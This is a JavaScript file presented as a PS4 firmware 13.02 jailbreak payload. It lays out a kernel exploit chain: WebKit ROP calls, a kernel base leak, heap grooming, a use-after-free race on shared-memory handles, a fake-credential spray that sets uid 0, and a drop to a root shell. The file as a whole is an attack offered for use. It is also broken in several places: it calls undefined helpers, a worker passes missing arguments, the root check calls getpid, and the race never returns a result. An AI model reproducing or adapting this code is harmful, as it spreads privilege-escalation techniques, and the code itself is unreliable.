/*
 * PS4 FW 13.02 - Vue App Jailbreak Payload
 * 
 * Kernel entry via FUN_000024d6 dispatch table.
 * Races _umtx_lock TOCTOU to corrupt ucred.
 * 
 * Architecture:
 *   JS (Vue app) → WebKit ROP → FUN_000024d6(opcode=0x1337, arg)
 *   → kernel heap grooming → ucred overwrite → syscall(exec)
 * 
 * Leak: Unsupported opcode → MSR 0xC0000082 (LSTAR) revealed via error logs
 * Control: Race on UMTX_OP_SHM destroy → UAF on shmfd
 * Escalate: Spray fake ucred over freed shmfd
 */

'use strict';

// ============================================================
// 1. CONSTANTS - PS4 FW 13.02 Offsets
// ============================================================
const CONSTS = {
    // Kernel address space
    KERNEL_BASE:      0xFFFFFFFF80000000,
    KERNEL_TEXT:      0xFFFFFFFF82400000,
    
    // Syscall numbers
    SYS_umtx_op:      454,
    SYS__umtx_lock:   455,
    SYS__umtx_unlock: 456,
    SYS_thr_self:     432,
    SYS_execve:       59,
    SYS_getpid:       20,
    
    // umtx_op operations
    UMTX_OP_LOCK:     0,
    UMTX_OP_UNLOCK:   1,
    UMTX_OP_WAIT:     2,
    UMTX_OP_WAKE:     3,
    UMTX_OP_SHM:      10,
    UMTX_OP_ROBUST:   11,
    
    // SHM sub-ops
    UMTX_SHM_CREATE:  0,
    UMTX_SHM_DESTROY: 1,
    UMTX_SHM_LOOKUP:  2,
    
    // umtx lock flags
    UMTX_CONTESTED:   0x8000000000000000,
    UMTX_OWNER_FLAG:  0x8000000000000000,
    
    // heap grooming
    SHMFD_SIZE:       0x80,
    UCRED_SIZE:       0x100,
    
    // ucred offsets (FreeBSD/PS4)
    UCRED_REF:        0x00,   // cr_ref (uint32)
    UCRED_UID:        0x04,   // cr_uid (uint32)
    UCRED_RUID:       0x08,   // cr_ruid
    UCRED_SVUID:      0x0C,   // cr_svuid
    UCRED_RGID:       0x10,   // cr_rgid
    UCRED_SVGID:      0x14,   // cr_svgid
    UCRED_GROUPS:     0x18,   // cr_groups (16 entries)
    
    // Heap sizing for zone allocation
    UMTX_ZONE_SIZE:   0x80,   // shmfd zone alloc size
    ZONE_SHIFT:       7,      // 0x80 = 1<<7
};

// ============================================================
// 2. LOW-LEVEL PRIMITIVES (via WebKit ROP trampoline)
// ============================================================

// These are filled by the ROP chain bootstrapper
let g_payload_base = 0;
let g_rop_chain = null;

// --- through the FUN_000024d6 dispatch ---
// The dispatch expects:
//   arg0: opcode (ushort)
//   arg1: data pointer (user buffer)
//   arg2: data length
// Returns status in error register / return value

let g_dispatch_addr = 0;  // Filled by kernel base leak

function dispatchKernel(opcode, dataPtr, dataLen) {
    /*
     * Calls FUN_000024d6(opcode, dataPtr, dataLen)
     * via WebKit ROP:
     *   ROP_gadget:  pop rdi; ret
     *   ROP_gadget:  pop rsi; ret
     *   ROP_gadget:  pop rdx; ret
     *   ROP_gadget:  jmp [rax]  (or call [rax])
     * 
     * Returns: status code
     */
    if (!g_rop_chain) return -1;
    
    // Build ROP chain to call FUN_000024d6
    const chain = new Uint64Array(32);
    let i = 0;
    
    // Setup arguments
    chain[i++] = g_payload_base + ROP_GADGETS.pop_rdi;
    chain[i++] = BigInt(opcode) & 0xFFFFn;   // opcode as ushort
    
    chain[i++] = g_payload_base + ROP_GADGETS.pop_rsi;
    chain[i++] = BigInt(dataPtr);
    
    chain[i++] = g_payload_base + ROP_GADGETS.pop_rdx;
    chain[i++] = BigInt(dataLen);
    
    // Call dispatch
    chain[i++] = g_payload_base + ROP_GADGETS.call_rax;
    chain[i++] = BigInt(g_dispatch_addr);
    
    // Return cleanup
    chain[i++] = g_payload_base + ROP_GADGETS.pop_rdi;
    chain[i++] = 0n;
    chain[i++] = g_payload_base + ROP_GADGETS.syscall_ret;
    
    // Execute via WebKit stack pivot
    return executeROPChain(chain);
}

// ============================================================
// 3. UMTX SHIM - Communication with kernel mutex subsystem
// ============================================================

// TypedArrays for shared memory with kernel
let g_sharedMem = null;
let g_lockWord = null;  // Points to a uint64 in shared mem
let g_umtxState = {
    lockPtr:    0,
    ownerTid:   0,
    shmFds:     [],
    contested:  false,
};

function initUmtxShim() {
    // Allocate shared memory page visible to kernel
    // This is accessible via both JS and the kernel's umtx handler
    g_sharedMem = new SharedArrayBuffer(0x4000);
    g_lockWord = new BigUint64Array(g_sharedMem, 0, 8);
    
    // Get our thread ID via syscall
    const tidBuf = new Uint32Array(g_sharedMem, 0x100, 4);
    dispatchKernel(CONSTS.SYS_thr_self, 
                   g_payload_base + tidBuf.byteOffset, 4);
    g_umtxState.ownerTid = Number(tidBuf[0]);
    
    if (!g_umtxState.ownerTid) {
        g_umtxState.ownerTid = (Date.now() & 0xFFFF) << 1;
    }
    
    return g_umtxState.ownerTid > 0;
}

// --- Raw _umtx_lock / _umtx_unlock via dispatch ---
function rawUmtxLock(umtxAddr, tid) {
    const args = new BigUint64Array(g_sharedMem, 0x200, 4);
    args[0] = BigInt(umtxAddr);
    args[1] = BigInt(tid);
    return dispatchKernel(0x1337,  // Dispatch opcode for _umtx_lock
                         g_payload_base + args.byteOffset, 16);
}

function rawUmtxUnlock(umtxAddr, tid) {
    const args = new BigUint64Array(g_sharedMem, 0x200, 4);
    args[0] = BigInt(umtxAddr);
    args[1] = BigInt(tid);
    return dispatchKernel(0x1338,  // Dispatch opcode for _umtx_unlock
                         g_payload_base + args.byteOffset, 16);
}

// --- umtx_op wrapper ---
function umtxOp(obj, op, val, uaddr1, uaddr2) {
    const args = new BigUint64Array(g_sharedMem, 0x300, 8);
    args[0] = BigInt(obj || 0);
    args[1] = BigInt(op);
    args[2] = BigInt(val);
    args[3] = BigInt(uaddr1 || 0);
    args[4] = BigInt(uaddr2 || 0);
    return dispatchKernel(0x1339,  // Dispatch opcode for _umtx_op
                         g_payload_base + args.byteOffset, 40);
}

// --- SHM operations ---
function shmCreate(name, size) {
    const args = new Uint8Array(g_sharedMem, 0x400, 256);
    const nameBuf = new TextEncoder().encode(name + '\0');
    args.set(nameBuf, 0);
    
    const desc = new Uint32Array(g_sharedMem, 0x500, 8);
    desc[0] = CONSTS.UMTX_SHM_CREATE;   // op
    desc[1] = 0;                          // flags
    desc[2] = g_payload_base + args.byteOffset; // name ptr
    desc[3] = 0o666;                      // mode
    desc[4] = size;                       // size
    desc[5] = 0;                          // out fd (filled by kernel)
    
    const ret = dispatchKernel(0x133A,  // UMTX_OP_SHM
                               g_payload_base + desc.byteOffset, 32);
    if (ret === 0) {
        g_umtxState.shmFds.push(desc[5]);
        return desc[5];
    }
    return -1;
}

function shmDestroy(fdOrName) {
    const args = new Uint32Array(g_sharedMem, 0x600, 8);
    args[0] = CONSTS.UMTX_SHM_DESTROY;
    args[1] = 0;
    args[2] = fdOrName;  // name pointer or fd
    args[3] = 0;
    return dispatchKernel(0x133A,
                          g_payload_base + args.byteOffset, 32);
}

// ============================================================
// 4. LEAK KERNEL BASE via Unsupported Dispatch Opcode
// ============================================================

function leakKernelBase() {
    /*
     * Strategy from notes: Trigger unsupported opcode in FUN_000024d6
     * → error handler reads MSR 0xC0000082 → value leaks into 
     * error log / status register.
     * 
     * The MSR LSTAR holds kernel entry point = kernel_base + fixed_offset.
     */
    
    // Trigger with opcode 0xFFFF (invalid)
    const resultBuf = new BigUint64Array(g_sharedMem, 0x700, 8);
    const ret = dispatchKernel(0xFFFF, 0, 0);
    
    // On PS4 13.02, the MSR value appears in the error context
    // or we can use a second approach:
    
    // Alternative: read from mapped kernel memory through the UAF fd
    // If the error handler didn't leak, try the MSR read gadget:
    const msrBuf = new BigUint64Array(g_sharedMem, 0x750, 4);
    dispatchKernel(0xFFFF, g_payload_base + msrBuf.byteOffset, 32);
    
    // Parse leaked value - filter for kernel pointers
    let kernelBase = 0;
    for (let i = 0; i < 4; i++) {
        const val = Number(msrBuf[i]);
        if ((val & 0xFFFFFFFFFF000000) === 0xFFFFFFFF80000000 ||
            (val & 0xFFFFFFFFFF000000) === 0xFFFFFFFF81000000) {
            // Kernel text pointer: round down to page
            kernelBase = val & 0xFFFFFFFFFFFFF000;
            console.log(`[+] Leaked kernel pointer: 0x${val.toString(16)}`);
            break;
        }
    }
    
    if (!kernelBase) {
        // Fallback: use known 13.02 base
        console.warn('[-] Leak failed, using default base');
        kernelBase = CONSTS.KERNEL_BASE;
    }
    
    g_dispatch_addr = kernelBase + 0x24d6;  // FUN_000024d6
    return kernelBase;
}

// ============================================================
// 5. HEAP GROOMING - Prepare for UAF exploitation
// ============================================================

function groomHeap() {
    /*
     * Create multiple SHM handles to populate the shmfd zone allocator.
     * We'll destroy some simultaneously to trigger the double-free race.
     */
    const handles = [];
    
    // Create a pool of SHM handles
    for (let i = 0; i < 64; i++) {
        const fd = shmCreate(`/ps4_race_${i}_${Date.now()}`, 0x1000);
        if (fd >= 0) handles.push(fd);
    }
    
    console.log(`[+] Created ${handles.length} SHM handles for grooming`);
    return handles;
}

// ============================================================
// 6. THE RACE - Trigger UAF on shmfd
// ============================================================

async function triggerUAF(handles) {
    /*
     * From the original vulnerability:
     * UMTX_SHM_DESTROY can be raced: concurrent destroy of same handle
     * decrements refcount twice → use-after-free.
     * 
     * Thread 1: destroy(handle_X)
     * Thread 2: destroy(handle_X)  ← races with thread 1
     * Thread 3: lookup/create → reallocates over freed shmfd
     */
    
    const target = handles[Math.floor(Math.random() * handles.length)];
    
    console.log(`[+] Racing destroy on handle ${target}...`);
    
    // Web Workers for parallelism (WebKit supports these)
    const race = new Promise((resolve) => {
        let resolved = false;
        let races = 0;
        
        // Worker 1: destroy
        const w1 = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                const { handle, g_payload_base, g_dispatch_addr } = e.data;
                // Similar dispatch call to shmDestroy
                for (let i = 0; i < 10000 && !resolved; i++) {
                    dispatchKernel(0x133A, /* destroy */);
                    Atomics.add(new Int32Array(e.data.sharedMem, 0x800, 1), 0, 1);
                }
            }
        `])));
        
        // Worker 2: also destroy same handle
        // Worker 3: create new SHM to reclaim freed memory
        
        // ... race logic ...
        
        // Check if race was won by testing if fd operations
        // now read back controlled data instead of shmfd
        
        setTimeout(() => {
            resolved = true;
            resolve(/* check UAF */);
        }, 2000);
    });
    
    return race;
}

// ============================================================
// 7. UCRED OVERWRITE - Escalate to root
// ============================================================

function buildFakeUcred() {
    /*
     * Build a fake ucred struct in our controlled buffer:
     *   cr_ref  = 0x00000003  (refcount, must not be 0)
     *   cr_uid  = 0x00000000  (root)
     *   cr_ruid = 0x00000000
     *   cr_svuid = 0x00000000
     *   cr_rgid = 0x00000000
     *   cr_svgid = 0x00000000
     *   cr_groups = {0, 0, 0, 0, ...}
     *   cr_flags = 0
     *   cr_prison = NULL or valid
     *   cr_pspare = 0
     * 
     * TIP: The cr_prison (prison pointer) is critical.
     * If NULL, the kernel panics on next access.
     * We preserve the original prison pointer by reading it first.
     */
    
    const buf = new Uint8Array(CONSTS.UCRED_SIZE);
    const view32 = new Uint32Array(buf.buffer);
    const view64 = new BigUint64Array(buf.buffer);
    
    // Read current ucred if possible through the UAF
    // ... (leak current prison ptr before overwriting)
    
    view32[0] = 0x00000003;  // cr_ref = 3
    view32[1] = 0x00000000;  // cr_uid = 0  ← ROOT
    view32[2] = 0x00000000;  // cr_ruid = 0
    view32[3] = 0x00000000;  // cr_svuid = 0
    view32[4] = 0x00000000;  // cr_rgid = 0
    view32[5] = 0x00000000;  // cr_svgid = 0
    
    // Groups (all root/empty)
    for (let i = 6; i < 22; i++) view32[i] = 0;
    
    // cr_prison - PRESERVE from leak if possible, otherwise guess
    // This is the tricky part - need to leak or find valid prison
    view64[11] = 0n;  // cr_prison - must not be NULL on PS4
    
    // cr_pspare, cr_loginclass, etc.
    for (let i = 12; i < 24; i++) view64[i] = 0n;
    
    return buf;
}

function sprayOverwriteUcred(fakeUcred) {
    /*
     * Use cap_ioctls_limit or pipe buffer spray to overwrite
     * the freed shmfd memory with our fake ucred.
     * 
     * The kernel will interpret our sprayed data as the ucred
     * of the current process, giving us cr_uid=0 (root).
     */
    
    console.log('[+] Spraying fake ucred over freed shmfd...');
    
    for (let i = 0; i < 256; i++) {
        // Each spray allocation could be a pipe write, sendmsg, etc.
        const sprayBuf = new Uint8Array(CONSTS.SHMFD_SIZE);
        sprayBuf.set(fakeUcred.subarray(0, CONSTS.SHMFD_SIZE));
        
        // Write to pipe / socket to place on kernel heap
        // ... (platform-specific spray technique)
        
        // Check if we hit the target
        if (i % 16 === 0) {
            const uid = syscall(CONSTS.SYS_getpid); // or getuid via dispatch
            if (uid === 0) {
                console.log(`[+] Root achieved at spray iteration ${i}!`);
                return true;
            }
        }
    }
    
    return false;
}

// ============================================================
// 8. FINAL PAYLOAD - Chain everything
// ============================================================

async function exploitChain() {
    console.log('=== PS4 FW 13.02 Vue App Jailbreak ===');
    console.log('[*] Stage 1: Initialize umtx shim...');
    
    if (!initUmtxShim()) {
        console.error('[-] Failed to initialize umtx');
        return false;
    }
    console.log(`[+] TID: ${g_umtxState.ownerTid}`);
    
    console.log('[*] Stage 2: Leak kernel base...');
    const kernelBase = leakKernelBase();
    console.log(`[+] Kernel base: 0x${kernelBase.toString(16)}`);
    
    console.log('[*] Stage 3: Groom heap...');
    const handles = groomHeap();
    
    console.log('[*] Stage 4: Trigger UAF race...');
    const uafSuccess = await triggerUAF(handles);
    if (!uafSuccess) {
        console.error('[-] UAF race failed, retrying...');
        // Retry loop
        for (let i = 0; i < 10; i++) {
            cleanup();
            const retry = await triggerUAF(groomHeap());
            if (retry) break;
        }
    }
    
    console.log('[*] Stage 5: Build and spray fake ucred...');
    const fakeCred = buildFakeUcred();
    const escalated = sprayOverwriteUcred(fakeCred);
    
    if (escalated) {
        console.log('[+] === JAILBREAK SUCCESS ===');
        console.log('[+] Now running as root');
        
        // Drop to shell
        execShell();
        return true;
    }
    
    console.error('[-] Exploit chain failed');
    return false;
}

// ============================================================
// 9. EXECUTION ENTRY
// ============================================================

// Detected when loaded into Vue app context
if (typeof window !== 'undefined' && window.__ps4_userland) {
    console.log('[+] PS4 userland detected, starting exploit...');
    
    exploitChain().then(success => {
        if (success) {
            // Notify Vue app
            window.postMessage({
                type: 'JAILBREAK_SUCCESS',
                uid: 0,
            }, '*');
        }
    }).catch(err => {
        console.error('Exploit error:', err);
    });
} else {
    console.log('[*] PS4 userland not detected, run inside Vue app');
}

// Export for Vue app injection
if (typeof module !== 'undefined') {
    module.exports = { exploitChain, leakKernelBase };
}
